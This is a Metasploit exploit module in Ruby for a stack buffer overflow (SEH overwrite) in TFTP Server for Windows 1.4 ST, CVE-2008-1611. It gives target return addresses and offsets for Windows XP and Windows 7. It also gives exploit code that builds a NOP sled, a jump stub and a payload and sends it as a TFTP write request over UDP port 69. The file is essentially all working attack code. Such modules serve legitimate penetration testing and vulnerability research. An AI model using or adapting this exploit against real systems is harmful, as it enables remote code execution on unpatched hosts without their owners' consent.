##
# $Id$
##
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/

##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
		Rank = GoodRanking
		include Msf::Exploit::Remote::Udp

		def initialize(info = {})

				super(update_info(info,
						'Name'			=> 'TFTP Server for Windows 1.4 ST Buffer Overflow Exploit (0day)',

						'Description'	=> %q{ TFTP Server for Windows V1.4 ST (0day) Coded by Mati Aharoni
											muts..at..offensive-security.com SEH Exploit
											ported to metasploit by Datacut},

						'Author'	=> [ 'Datacut' ],

						'Version'		=> '$Revision$',

						'References'	=>

								[

										[ 'CVE', '2008-1611' ],

										[ 'OSVDB', '43785' ],

										['BID', '18345' ],

										[ 'URL', 'http://www.exploit-db.com/exploits/5314/' ],

								],

						'DefaultOptions'=>

								{

										'EXITFUNC'	=>'seh',

								},

						'Payload'		=>

								{
											'Space'		=> 600,

										'BadChars'	=> "\x00\x2f",

										'StackAdjustment'=> -3500,

								},

						'Platform'		=> 'win',

						'Targets'		=>

								[

										# datacut tested ok 19/04/12 on xp sp2 sp3, win 7 sp0 sp1. possible may work for other service packs and or vista

										[ 'Windows XP SP2/SP3 EN', { 'Ret' => 0x416801 , 'Offset' => 1203} ], # pop pop ret tftpserversp.exe
										[ 'Windows 7 SP0/SP1 EN x64', { 'Ret' => 0x416801 , 'Offset' => 1217} ], # pop pop ret tftpserversp.exe
										[ 'Windows 7 SP0/SP1 EN x86', { 'Ret' => 0x416801 , 'Offset' => 1223} ] # pop pop ret tftpserversp.exe
								],

						'Privileged'	=> false,

						'DisclosureDate'=> 'Mar 26 2008',

						'DefaultTarget'	=> 2))


					register_options(

						[
									Opt::RPORT(69),

						], self)

		end


		def exploit

				connect_udp

				nops = make_nops(50)
				lead = rand_text_alphanumeric(target['Offset'] - payload.encoded.length - nops.length)
				near = "\xe9\x80\xfd\xff\xff"
				nseh = "\xeb\xf9\x90\x90"

				evil = lead + nops + payload.encoded + near + nseh + [target['Ret']].pack('V')
				mode = "netascii"

				sploit = "\x00\x02" + evil + "\0" + mode +"\0"

				udp_sock.put(sploit)

				handler
				disconnect_udp
		end
end
